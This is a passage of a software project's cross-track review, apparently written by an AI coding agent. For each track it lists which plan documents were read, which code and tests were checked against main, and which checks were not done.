Read in full: docs/plans/f-sdk/README.md, 01-shared.md, 04-review.md (with the X1 resolution notes), and the P1–P3, P9–P12, T11–T13 sections of 02-python.md and 03-typescript.md; docs/plans/maintenance/01-first-dependabot-batch.md; docs/plans/phase-0/06-ci-and-closeout.md in full, plus the section index, R6/R7/R12, "Findings covered" and "Not in this plan" of 07-review-fixes.md and the headings of 01–05. I read the cross-track review (X1–X38) first and did not re-report anything it covers: X31 changelog, X32 stale specs, X36 just check vs ci-ok and the commands table, X37 nvm path.

Checked against main:
- F delivery: git log shows every P/T sub-phase commit and the X1 commit.
- D-F-1–D-F-16 are in mvp-decisions, with the D80 and D121 annotations.
- The F1 spec edits are in spec 10 (Recorded data, Language differences, Testing), spec 06, spec 09, spec 02 and fixtures/otlp/README.
- The 11 fixtures/otlp/cetra/sdk-* cases exist.
- pyproject has the 10 extras plus all. package.json has the pins, optional peers and subpath exports.
- Python score queue: fork hook, buffer-full and retry warnings. TS score queue: drop and retry warnings.
- Python instrumentor TraceConfig; TS openai helper hideInputs.
- browser.ts feedback body matches the server's FeedbackRequest. The server has POST /api/v1/scores and ScoreCreate/ScoreBatch.
- e2e suites (tools/e2e/run.sh, test_e2e.py, e2e.test.ts). No TODO or type-ignore leftovers in sdks/.

Phase-0 and maintenance checks:
- Every recipe phase-0 promised is in the justfile.
- ci.yml jobs and ci-ok needs; advisories.yml; dependabot.yml (directories glob, arrow-side and TypeScript major ignores, groups).
- deny.toml family bans: the arrow list is complete against Cargo.lock.
- AGENTS.md § Dependencies and § CI text.
- The R6 tests (examples_match_the_openapi_document, manifest_matches_the_operations, every_fixture_file_is_used, write switches) and the § Open list.

Runbooks: `find docs -iname '*runbook*'` finds nothing, so there were none to review.

Not checked: I ran no tests, builds or CI. I did not line-by-line verify every serialization, masking or filter rule across the two SDKs. I did not re-audit phase-0 steps 01–05 and 07 sub-phase by sub-phase beyond the spot checks above. GitHub-side state (Dependabot PRs, branch protection) was not checked.

### Track G — spine

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad docs/reviews/cross-track.md, X1-X38) and docs/reviews/g-spine.md. Read in full: docs/plans/g-fixes/README.md and F1-F5, docs/plans/g-spine/00-design.md, 03-m3-writes-grpc-usage.md, 05-m5-ui-and-e2e.md, and the M1 plan's G1.6-G1.9. Skimmed M1 G1.1-G1.5, M2 and M4 through their test names. Every long identifier those plans name was grepped against crates/, tools/, web/, sdks/, the justfile and .github/, and only incidental names were missing.

Checked against code on this branch (main at 4cca6bc):
- F1: crates/ui/src/lib.rs (FILE_EXTENSIONS, is_page_load, none_match, the CSP, all 5 tests), spec 11, spec 12 and the D-G-35 text.
- F2: live.rs StreamTiming, streams.rs (the send helper, all 11 sends converted, the max_age arms, all 5 tests), spec 09 and the D-G-34 text.
- F3: read.rs check_search and its 3 callers, with the check before take_slot; the doc comments, spec 05, D-G-22 and D-G-39.
- F4: commit_in_task, Commits/CommitGuard, wait_for_commits in serve.rs shutdown, both callers, both tests and D-G-38.
- F5: the justfile e2e recipe, both e2e tests (dotted deep link, streams, every read route, media with min_bytes), the AGENTS row and D-G-18.
- M1: fixtures_tests.rs (golden, parallel and shutdown tests).
- M3: grpc.rs in full, feedback tests, usage.rs flush, serve.rs spawn_usage and Server::builder, key_only_project.
- Also: tools/e2e/run.sh, web/src/lib/sse.ts, and the deploy grace periods (compose and helm).
- G's requests to other tracks: crates/storage/src/error.rs, otel media.rs is_mime, and the storage media API.

Every g-fixes phase was delivered as written, and the roadmap and review follow-ups were done.

Not re-reported because the cross-track review already covers them:
- model_prices (X29);
- /readyz (X27);
- CHANGELOG (X31);
- the stale roadmap G decision range, D-G-11 'track N', README S12 memory-serve and spec 12's lease line (X32);
- just check versus CI (X36);
- the nvm path (X37);
- fixture IDs (X38).

Not done:
- Nothing was run (no tests, no just recipes).
- The M2 and M4 plans were not re-audited line by line; the earlier G review covered them.
- Whether hyper's HTTP/2 default stream limit applies to the tonic server was not checked against source; the G-1 finding does not depend on it.
- MCP search_traces, which has no 1 KiB cap like D-G-39, belongs to track H and was not reported.

### Track H — console

Read the cross-track review (X1–X38) first and left out anything it already covers: X17 EXPLAIN, X31 changelog, X33 roadmap Order, X35 migration numbers, X37 nvm path, X38 fixture ids.

Read in full: h-console README and the plans for H1–H9 (all 749 lines of H9) and H10 lines 1–140. For H11–H13 I read the section structure, the Facts, the state tables, the "Done when" lists and the roadmap step, but not every web step. The roadmap row says H1–H13 are all Implemented, and git confirms each sub-phase landed as its own commit (fbb5233, a866f95, dead8e2, 4537865, 1ca00ee, 2926975, cea5baa, d503064, f43072d, dbb26e0, c63c000, 3096433, 7965cea), followed by polish commits (48ba9eb, 95df30e, cb2425b, f947ef8, dd4f80b, ae64c39, b04332d, a9b2457). So I checked delivery, not unwritten plans.

Checked against main:
- **Server:** ProjectPerm::Query, reads_by_post and the access suite; migration 0003 and its 27 store tests; the saved-view routes and all promised tests; routes/sql.rs with every H4 and H5 test; ApiError::Sql and its tests; the test_support helpers (add_member, personal_token, serve_loopback, read_to_end, next_frame).
- **MCP:** mcp/{mod,output,tools,sql,traces}.rs and every planned test; the rmcp 3.10.0 pin in Cargo.toml and Cargo.lock; the rmcp=warn log filter and its test in cli main.rs.
- **CLI:** client.rs, credentials.rs, output.rs, query.rs, traces.rs, projects.rs and test_server.rs, with all planned tests; config.rs is_filtered and cli_variables_are_not_config_keys.
- **Web:** the files and tests listed in the plans exist (nav entry, shortcuts, search/sql, mocks/sql, lib/sql/*, components/sql/*, the route test, the five spec-05 examples). I looked at sql-console.tsx's ?view= logic and export.ts.
- **Docs:** spec 05/08/09/11/12 and D-H-1..13 are consistent with the code. The cancel-on-disconnect polish is recorded in spec 09.
- **Hygiene:** no unwrap/expect before #[cfg(test)] in the H modules, and no TODO leftovers.
- **Tokenizer:** I checked sqlparser 0.62 GenericDialect directly (supports_nested_comments and supports_string_escape_constant are both true) to judge the two client placeholder scanners.

Not checked: every step of the H10–H13 plans line by line; web behaviour beyond reading the code; whether `context.ct` really cancels on disconnect in rmcp (I relied on the test a_disconnected_call_drops_its_query). I did not run any tests.

### Track I — online evaluation

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad, X1–X38). I did not re-report X7 (QueryOptions builder), X10 (rule-limit hook), X12/D-I-35 (units cap), X13/X35 (migration numbers), X19 (judge-trace retention), X31 (CHANGELOG), X37 (nvm path) or X38 (fixture ids).

Plans read in full:
- docs/plans/i-online-eval/00-design.md
- 03-m3-queue-rules.md (all 12 sub-phases)
- 04-m4-triggers.md (all 8 sub-phases)

Plans read by headings and the key sections only: 01-m1-secrets-connections.md and 02-m2-evaluators.md.

Branches compared with main:
- origin/claude/i-m3-plan is older than main.
- origin/claude/i-m3-m4-plans differs from main only by the X10/X12/X13 fixes (D-I-35, M4 migration wording).
- The local, unpushed branch claude/i-m3-impl holds I3.1–I3.7 and I3.10–I3.12. I3.8 and I3.9 are not there yet. I used it only as evidence (writes.test.ts, execute.rs pause handling, candidate SQL), not for a code review.

M1/M2 delivery checked on main by grep: crypto.rs (ENCRYPTED_COLUMNS, secret.key.new recovery), admin rotate-encryption-key and its CLI subcommand, config keys, connections routes and test, ConnectionCache, Usage::add_judge, D-I-31 billable filter in Ingest::commit, Ingest::context/prices, storage trace_spans, eval/trace_load.rs, definitions cache and fits_definition, evaluator, template, test and score-definition routes, ManageEvaluation/ManageConnections, WebhookConfig.secret_enc gone from crates/eval, Variables::iter, spec 04 encryption and billable-span text, web pages. I found no undelivered M1/M2 item beyond what X-findings already cover.

Plan assumptions verified against main: serve.rs startup and shutdown order and Drop, scores::write, the QueryOptions semantics, TraceRefreshRequest, check_alert_filter, open_query, TimeWindow::new, api_examples helpers, ProjectRow/ProjectPatch/update_project, the web trace route, the eval crate's error classes (judge/http.rs), and set_connection_status not bumping updated_at.

Not checked:
- I did not run any build or test.
- I did not read M5/M6 plans (not written). M6 issues are judged from the design only.
- I did not review the claude/i-m3-impl code line by line.
- I did not measure SQLite cost of the candidate query. I-3 is reasoned from the SQL and the queue semantics.

### Track K — alerts

Read the cross-track review (origin/claude/cross-track-review-6a41ad, X1–X38) first; K items it already covers (X7 the QueryOptions builder and D-K-16, X10 the hook rows, X25 the alerts-in-restore-drill request, X31 CHANGELOG, X33 the roadmap Order paragraph, X35 migration numbers, X37 the nvm path, X38 fixture ids) are not repeated. Read all 13 files in docs/plans/k-alerts/ in full, plus the resume notes. Track K is implemented on main (roadmap row K says Done, K1–K12; commits c9e48d7 through d96a427, plus the follow-ups 452c562, b293468, af98cfb and d96a427). I checked main against each sub-phase:
- K1: crates/storage/src/reads/alerts.rs and its 15 tests.
- K2: the eval re-exports, EvalRunner::egress and tests/egress_public.rs.
- K3/K4: condition.rs and channel.rs tests; migration 0005_alerts.sql, which is identical to spec 04 § Alerts; ENCRYPTED_COLUMNS and the generic key rotation in admin.rs; the meta::alerts tests.
- K5/K6/K8: the channels and alert_rules route tests, quota.rs, the deliver/tests.rs and message.rs tests.
- K7/K9: the evaluate.rs tests including the end-to-end test; spawn_loops in serve.rs.
- K10–K12: the web test files exist, with test counts that match or exceed the plans.
I also checked that spec 03, 04, 07, 08, 09 and 11 and mvp-decisions D-K-1–D-K-16 were amended. Every promised sub-phase, test and file landed, and I found no skipped or narrowed work. Small post-plan follow-ups changed details: a 1 MiB response cap, PATCH inside one transaction, and the Slack link filter dropped above 3000 characters. The plan files no longer describe these, but none is a decision-level change. What remains are design defects in the delivered behaviour, verified against the code: score-window semantics, latency/start_time windowing, and an unthrottled email test-send path. I did not run any tests or `just check`. I did not exercise the UI or a real Slack/SMTP endpoint, and I did not measure track I's judge lag; the lag argument relies on spec 06 § trace-completion (5 s idle, plus queue and up to 60 s per judge call).

### Track L — admin UI

Track L is fully implemented on main. The status line says "L1–L20 done on 2026-11-13", the roadmap row says Done, and there are 20 sub-phase commits (a1bef63 to e16fc29) plus three review-fix commits. L18 and L19 landed before L13–L17, which does no harm. Because the track is done, I checked delivery against the plans; I did not re-review the plans line by line.

What I read:
- The cross-track review (X1–X38) first. None of my findings repeats it: CHANGELOG is X31, the nvm path is X37, stale spec 08 lines are X32.
- The L README in full, and the L20 section of 06-admin.md.
- Spec 08 line 118, spec 09 § Auth and § Orgs/me, spec 11 § Navigation and § Settings.
- mvp-decisions § Track L and D-G-19/D-G-36, and the roadmap L row.
- G's M5 plan and the g-fixes F2 stream-lifetime plan.

Mechanical delivery checks:
- All 61 `web/src/...` paths named in the L plans exist; the only absent one is the git-ignored routeTree.gen.ts.
- All 264 test names written in the plans were looked up in the web test sources. 262 match exactly. The other two ("offers to sign out" and the divider test) exist under slightly different names or split into three tests.
- `gcTime: 0` is set on every mutation whose response carries a secret and on every mutation whose request carries a password or token, as D-L-5 and the pitfalls require.
- The writes.ts coverage test and the EXAMPLE0EXAMPLE0 needle in check-dist are present.
- RESERVED slugs cover every auth URL.
- Server error codes and details the UI relies on match.
- The 401 gate and middleware match D-L-1.
- Every contract gap CG1–CG5 was compared with openapi.json, the server and the specs.

Not done:
- I did not read 01–05 plan files paragraph by paragraph. They were cross-checked by files and test names only.
- I did not run any tests or the web build, and node_modules is absent.
- I did not test TanStack Router's matching for the CG2 project slug `settings` case.
- I did not check the 402/403 plan-error handling, which belongs to track P.

### Track M — deletion and retention

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad, X1–X38). I left out everything it already covers: X7 (scope reads and the QueryOptions builder), X8 (retention cap hook), X9 (usage_daily on org drop), X15 and X18 (restore and reapply), X16 (on_dropped), X17 (EXPLAIN), X19 (judge traces outliving retention), X26 (24 h promise against gc.grace), X31 (CHANGELOG) and X33/X35 (roadmap order, migration numbers).

Plans read in full: docs/plans/m-deletion/README.md and 01–12, with M8 (08-eval-cascade.md) read most closely. origin/claude/m8-align-i-m3 is identical to main for docs/plans/m-deletion: commit cf8c8c6 is already on main.

Cross-checked M8 against I's M3 plan (docs/plans/i-online-eval/03-m3-queue-rules.md): the eval_jobs schema, JobRow/JobUsage/Finish, finish, run_job steps 1–16, Ended/Pause, the test helpers, MockLlm::start_with_delay and routes/eval_jobs.rs. Also checked I's M4 plan for executor changes and pending_traces.

Checked what M1–M7 and M9–M12 delivered against the code on main:
- migration 0007_deletions.sql;
- meta/deletions.rs, with all promised functions and tests;
- storage reads/deletions.rs, with its 14 tests;
- deletion/{mod,guard,resolve}.rs: from_run/from_query/from_deletion mappings, the guard API, the worker tests, the guard load order in serve.rs;
- routes/deletions.rs: the M4 and M5 tests, and that create_deletion fills the guard only for trace_ids and user;
- retention.rs and routes/projects.rs: may_manage_retention is already P's body, and the cap is still None;
- admin.rs reapply_deletions and its CLI tests;
- the e2e deletion_end_to_end test;
- the web components (Data tab, delete-matching dialog, danger zone, forgetTrace, invalidateProjectReads);
- crates/eval/src/trace.rs, which sets the target metadata on the judge root span only;
- meta migrations and their foreign keys;
- spec 03 § 7–8, 04, 08, 09 and 12 text, and the roadmap M row and D-M-1..17 in mvp-decisions.

M1–M7 and M9–M12 match their plans, and I found no silently dropped sub-phases or tests.

Not done: no code or tests were run. I did not measure eval_jobs table sizes or the cost of a full eval-span scan in eval_trace_ids, so the performance claim in M-2 is based on reasoning only.

### Track N — packaging and backups

Read in full: docs/plans/n-packaging/README.md (M1), and every M2 plan file (00-design, 01–10) as they stand on origin/claude/n-m2-backup-plan, which is main plus ec212e4 (the X14/X15 fold). Read the cross-track review (X1–X38) first and did not re-report anything it covers. For M1 on main: checked the git log for N1–N11 and the later fixes; confirmed each file the plan lists exists and is mode 100755 where the plan requires it; checked the justfile recipes; and compared every '### `path`' code block in the M1 sub-phase files with the committed file. Compose, Dockerfile, Helm templates and values, install.sh, release.yml and every tools/packaging script match the plan byte for byte. The only differences are files the plan edits in part, and later D-N-13 changes. I found no gap in M1's delivery beyond the stale Q note (N-6). For M2: found the local implementation branches claude/n-m2-b1…b10 and claude/n-m2-impl. On n-m2-impl, B1–B7, B9 and B10 are done and B8 (CLI) is not. I compared that branch's docs, spec, roadmap, changelog and admin_socket.rs with the plans. Checked against main's code: Storage::open's startup GC (crates/storage/src/lib.rs 458-490), gc::collect_once, the object-deletion paths, the Helm statefulset's securityContext and volume, the AdminError texts and the reapply-deletions help text. Not done: I ran no tests or builds, and did not review the n-m2-impl code line by line. The Kubernetes volume-ownership claim in N-1 comes from the chart and how Kubernetes applies fsGroup (it changes the group, not the owner); I did not run it on a cluster.

### Track P — plans and entitlements

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad, X1–X38); findings that repeat X7–X12, X20, X22, X28, X31, X33, X35 or X37 are left out. Read in full: the PR #92 version of docs/plans/p-entitlements/00-design.md and the PR #92 diff of mvp-decisions, roadmap, spec 09 and 03-m3. Also read in full: 03-m3-units-and-limits.md. For 01-m1 and 02-m2, read the sub-phase headings and the M2 admin/test sections, then checked what landed on main against them:
- crates/token: keys.rs binds keys to kinds, includes cloud-1 and cloud-2, and limits dev-1 to debug builds; no profile turns debug-assertions on in release.
- ee/: license, project_roles and sso_enforcement are there; D-P-8 holds for expired licences.
- Migration 0008: org_entitlements and org_window_ends, with pruning.
- retention_window_at; the internal_orgs route; orgs.user_create; the admin entitlements show command; the Plan page.
- The tests M2 promised: grepped by name, all present.
M1 and M2 look delivered, with no narrowed sub-phases found. On PR #90 (M3 implementation), I checked the diff stat, the seat-limit call sites, the new log lines (no emails or payload), unwrap/expect (tests or invariant-commented), the spec 02/09/12 updates, and the CLI and admin.rs (not touched). M4 and M5 plans do not exist on any remote branch (checked every origin/* branch); the design rows were judged on their own. Not done: no build or tests were run, no line-by-line review of the PR #90 code, and the web and SDK parts of M3 were not checked against the plan.

### Track Q — cloud control plane (cetra-control)

Kept with the track (private repository).

### Track R — storage hardening

Read in full: the cross-track review (origin/claude/cross-track-review-6a41ad, X20–X24 and X30 for R, plus X31). Read in full: track R's 00-design.md and 01-m1-model.md, both the main version (99ffc91) and the newer pushed branch origin/claude/r-hardening-design-43eb31 (fe89e5e, which applies X20–X24 and X30). Also read the D-R-1…14 rows and the roadmap R row. No M2–M7 plans are pushed. A local, unpushed branch claude/r-m1-model holds R1.1 and R1.2 code; I only skimmed it for deviations and did not review it. The branch merges cleanly onto main.

I checked the plan's claims against crates/storage. Each item below was checked:
- Harness and teardown: Storage::drop and the background tasks it aborts, StorageConfig fields and validator limits, the background task intervals (compaction uses interval_at, so the first tick is not immediate).
- Test helpers: test_support (span_row, score_row, object_rows), and the cfg(test) Storage methods staged_paths, catalog_files and published_rows.
- Every reads signature the plan uses: trace/span list and detail, scores, sessions, users, metrics KPIs, alerts, filter_trace_ids, user_deletion_scope, eval_trace_ids. Also QueryContext::new.
- Deletion logic: DeletionScope, register_deletion validation, covered_predicate, project_snapshot, and how the traces view gates files by deletions_applied_seq. Flush and compaction stamp known_seq, so the plan's 'pending reads the same as applied' claim holds.
- Dedup and compaction: dedup keeps the latest copy; the compaction day-close and closed rules. The server resolve path matches the plan.
- The audit claims, all confirmed: IoJob::commit rotates without syncing the old segment, discard_unacked, write_renamed, and replay of a torn tail.
- Other existing code: the hooks (24 points; pause blocks on a condvar), the old compaction/model.rs and its regression file, proptest 1.12 env vars, workspace lints, and that the storage and otel crates use `lints.workspace = true`.

Not checked:
- I did not run any test or build.
- I did not measure the model-test budget.
- I did not review the M2–M8 designs in depth beyond the points reported, because their plans are not written yet.
